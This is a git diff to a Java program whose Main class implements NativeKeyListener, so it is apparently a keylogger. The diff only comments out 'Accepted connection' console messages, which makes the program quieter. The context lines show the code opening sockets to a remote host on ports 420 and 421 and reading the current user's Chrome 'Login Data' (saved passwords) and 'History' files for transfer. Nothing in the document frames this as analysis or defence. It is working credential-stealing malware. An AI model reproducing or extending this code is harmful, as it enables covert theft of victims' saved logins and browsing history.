@@ -212,7 +212,7 @@ public class Main implements NativeKeyListener{
 			out.flush();
 			socket.close();
 			Socket nakadashi = new Socket(getHostIP(), 420);
-			System.out.println("Accepted connection : " + nakadashi); 
+			// System.out.println("Accepted connection : " + nakadashi); 
 			File transferFile = new File ("C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data"); 
 			byte [] bytearray = new byte [(int)transferFile.length()]; 
 			FileInputStream fin = new FileInputStream(transferFile); 
@@ -239,7 +239,7 @@ public class Main implements NativeKeyListener{
 					out.flush();
 					socket.close();
 					Socket nakadashi = new Socket(getHostIP(), 421);
-					System.out.println("Accepted connection : " + nakadashi); 
+					// System.out.println("Accepted connection : " + nakadashi); 
 					File transferFile = new File ("C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/History"); 
 					byte [] bytearray = new byte [(int)transferFile.length()]; 
 					FileInputStream fin = new FileInputStream(transferFile); 
